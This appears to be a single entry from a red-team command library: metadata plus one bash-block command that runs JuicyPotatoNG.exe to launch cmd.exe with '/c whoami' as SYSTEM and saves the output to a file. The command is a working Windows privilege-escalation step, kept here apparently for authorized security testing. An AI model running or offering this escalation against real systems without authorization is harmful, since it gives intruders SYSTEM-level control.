---
id: 20dab716-9d60-4cdc-86cc-29af2db2a34e
name: Run JuicyPotatoNG to execute a command as System
type: command
executor: bash
data: JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
output: null
created_at: '2023-04-06T03:56:30.268882+00:00'
updated_at: '2023-04-10T20:37:34.799796+00:00'
---

# Run JuicyPotatoNG to execute a command as System

```bash
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
```
